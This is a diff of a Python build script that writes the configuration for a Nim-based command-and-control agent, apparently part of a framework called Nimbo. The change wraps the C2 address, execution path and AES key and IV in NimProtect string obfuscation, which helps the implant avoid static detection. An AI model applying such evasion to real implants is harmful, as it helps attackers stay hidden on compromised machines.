@@ -7,20 +7,22 @@ config_agent_file = os.path.join(nimbo_root, "agent", "config.nim")
 config = JsoncParser.parse_file(os.path.join(nimbo_root, "config.jsonc"))
 
 config_agent = f"""
+import NimProtect
+
 ############################ CONFIG ############################
 # C2
-let c2_scheme = "{config["listener"]["scheme"]}"
-let c2_address = "{config["listener"]["address"]}"
+let c2_scheme = protectString("{config["listener"]["scheme"]}")
+let c2_address = protectString("{config["listener"]["address"]}")
 let c2_port = {config["listener"]["port"]}
 # Agent
 let is_exe = IS_EXE
 let sleep_on_execution = {config["agent"]["sleep_on_execution"]}
-let agent_execution_path = "{config["agent"]["exe"]["execution_path"]}"
+let agent_execution_path = protectString("{config["agent"]["exe"]["execution_path"]}")
 var call_home_timeframe = {config["agent"]["call_home_timeframe"]}
 var call_home_jitter_percent = {config["agent"]["call_home_jitter_percent"]}
 # Communication
-let communication_aes_key = "{config["communication"]["aes_key"]}"
-let communication_aes_iv = "{config["communication"]["aes_iv"]}"
+let communication_aes_key = protectString("{config["communication"]["aes_key"]}")
+let communication_aes_iv = protectString("{config["communication"]["aes_iv"]}")
 # Tasks
 let could_not_retrieve = "-"
 ############################ CONFIG ############################
